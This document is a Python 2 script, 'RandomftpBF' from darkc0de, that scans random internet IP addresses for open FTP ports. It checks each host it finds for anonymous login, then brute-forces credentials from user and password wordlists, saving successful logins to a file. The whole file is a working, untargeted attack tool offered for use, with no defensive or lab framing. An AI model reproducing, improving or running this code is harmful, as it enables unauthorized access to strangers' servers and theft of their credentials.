#!usr/bin/python
#Uses nmap or socket to check if ftp is open on a random ip. If
#the server is found it will check for anonymous login and then
#continue to bruteforce. It also can save successful logins
#to an external file.

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, StringIO, commands, random, sys, ftplib, re, socket
from ftplib import FTP

def rand():
	a = random.randrange(255) + 1
	b = random.randrange(255) + 1
	c = random.randrange(255) + 1
	d = random.randrange(255) + 1
	ip = "%d.%d.%d.%d" % (a,b,c,d)
	return ip

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def nmapscan():
	
	#Change this to your nmap preferences
	nmap = "nmap -P0 -iR 1 -p 21 | grep open -B 3"
	nmap = StringIO.StringIO(commands.getstatusoutput(nmap)[1]).readlines()
	
	for tmp in nmap:
		ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ipaddr:    		
			return ipaddr
		
def servscan():
	
	ipaddr = rand()
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5)
		s.connect((ipaddr, 21))
		s.close() 
		return ipaddr
	except socket.error:
		pass
		
def workhorse(ipaddr, user, word):
	user = user.replace("\n","")
	word = word.replace("\n","")
	try:
		print "-"*12
		print "User:",user,"Password:",word
		ftp = FTP(ipaddr)
		ftp.login(user, word)
		ftp.retrlines('LIST')
		print "\t\n[!] Login successful:",user, word
		if txt != None:
			save_file.writelines(user+" : "+word+" @ "+ipaddr+":21\n")
		ftp.quit()
		sys.exit(2)
	except (ftplib.all_errors), msg: 
		#print "[-] An error occurred:", msg
		pass
		
def brute(ipaddr):
	print "-"*30
	print "\n[+] Attempting BruteForce:",ipaddr,"\n"
	try:
		f = FTP(ipaddr)
		print "[+] Response:",f.getwelcome()
	except (ftplib.all_errors):
		pass
	try:
		print "\n[+] Checking for anonymous login:",ipaddr,"\n"
		ftp = FTP(ipaddr)
		ftp.login()
		ftp.retrlines('LIST')
		print "\t\n[!] Anonymous login successful!!!\n"
		if txt != None:
			save_file.writelines("Anonymous:"+ipaddr+":21\n")
		ftp.quit()
	except (ftplib.all_errors): 
		print "[-] Anonymous login unsuccessful\n"
	for user in users:
		for word in words:
			work = threading.Thread(target = workhorse, args=(ipaddr, user, word)).start()
			time.sleep(1)

if len(sys.argv) not in [4,5,6,7]:
	print "\nUsage: ./randftpbf.py <how many to scan> <userlist> <wordlist> <options>"
	print "\t[option]"
	print "\t   -nmap/-n : Uses sockets instead of nmap to find open ports"
	print "\t   -save/-s <file> : Save Successful Logins"
	print "\nExample: ./randftpbf.py 10000 users.txt words.txt -nmap -save hits.txt\n"
	sys.exit(0)

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "[-] Error: Check your userlist path\n"
  	sys.exit(1)
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "[-] Error: Check your wordlist path\n"
  	sys.exit(1)
	
for arg in sys.argv[1:]:
	if arg.lower() == "-nmap" or arg.lower() == "-n":
		nmap = 1
	if arg.lower() == "-save" or arg.lower() == "-s":
		txt = sys.argv[int(sys.argv[1:].index(arg))+2]

print "\n\t   d3hydr8[at]gmail[dot]com RandomftpBF v1.1"
print "\t-----------------------------------------------\n"
print "[+] Scanning:",sys.argv[1],"hosts"
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words)

try:
	if txt:
		save_file = open(txt, "a")
		print "[+] Save File:",txt
except(NameError):
	txt = None
	print "[-] Saving Mode Off"
	
print "[+] Scan Started:",timer()		
try:
	if nmap == 1:
		print "[+] Socket Scan Mode\n"
		for x in xrange(int(sys.argv[1])):
			print "[-]",x+1,"of",sys.argv[1]
			#Change this limit for faster results.
			time.sleep(3)
			ipaddr = servscan()
			if ipaddr != None:
				brute(ipaddr)
		print "\n[+] Scan Complete:",timer()
	else:
		print "\n[-] Error: Check your options\n"
		sys.exit(1)
except(NameError):
	print "[+] Nmap Mode\n"
	for x in xrange(int(sys.argv[1])):
		print "[-]",x+1,"of",sys.argv[1]
		#Change this limit for faster results.
		time.sleep(3)
		ipaddr = nmapscan()
		if ipaddr != None:
			brute(ipaddr[0])
	print "\n[+] Scan Complete:",timer()


